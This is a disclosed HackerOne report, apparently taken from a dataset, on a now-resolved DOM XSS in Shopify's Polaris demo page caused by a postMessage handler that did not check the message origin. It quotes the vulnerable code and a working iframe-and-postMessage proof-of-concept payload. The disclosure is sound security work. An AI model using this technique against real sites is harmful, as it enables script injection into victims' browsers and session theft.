---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '894518'
original_report_id: '894518'
title: xss on polaris.shopify.com/demo using postMessage
weakness: Cross-site Scripting (XSS) - DOM
team_handle: shopify
created_at: '2020-06-09T14:17:40.893Z'
disclosed_at: '2021-02-11T19:09:45.982Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
asset_identifier: '*.shopify.com'
asset_type: WILDCARD
max_severity: medium
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# xss on polaris.shopify.com/demo using postMessage

## Metadata

- HackerOne Report ID: 894518
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: shopify
- Disclosed At: 2021-02-11T19:09:45.982Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

# Description

it's possible to run arbitrary js code using https://polaris.shopify.com/demo + `postMessage`

following codes are from [this file](https://polaris.shopify.com/assets/baseline/demo-3801177f8c9e2fc96d7fbd9b73f76b32a8aa35fee26bee5aa0964e71955cf960.js) which formatted using [prettier](https://prettier.io/playground/)

`Demo` component (line 381) uses `addEventListener` to listen for `message` events (line #401):

```js
          componentDidMount() {
            window.addEventListener("message", this.handleMessage),
              this.throttledSendDetails(),
              window.addEventListener("click", handleAnchorClick);
          }
```

`handleMessage` method (line #499) will set `data.ats` as component state without checking message origin:

```js
          handleMessage(e) {
            var { data: t } = e;
            console.log(e);
            var r = Object(_app_utilities_ast__WEBPACK_IMPORTED_MODULE_61__.a)(
              t.ast.code
            );
            t &&
              Object.prototype.hasOwnProperty.call(t, "ast") &&
              this.setState({
                ast: r,
                fullSizeExamples: t.fullSizeExamples,
                omitAppProvider: t.omitAppProvider,
              });
          }
```

`ast.code` later rendered as React code.

# Step to Reproduce

1. create a HTML file containing an `iframe` with `https://polaris.shopify.com/demo` as `src`
2. after iframe loaded, send a message with `{ast: {code: "JSX code"}}` as data

```html
    <iframe id="ifrm" src="https://polaris.shopify.com/demo" height="100%" width="100%" frameborder="0"></iframe>
    <script>
      var ifrm = document.getElementById('ifrm');
      ifrm.onload = function() {
        ifrm.contentWindow.postMessage({ast: {
          code: "<img src='x' onError={() => alert(document.location)} />;",
        }}, '*');
      }
    </script>
```

# PoC

http://209.141.43.59/shopify-xss.html

## Impact

attacker can use bug to run arbitrary js code in victims browser.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
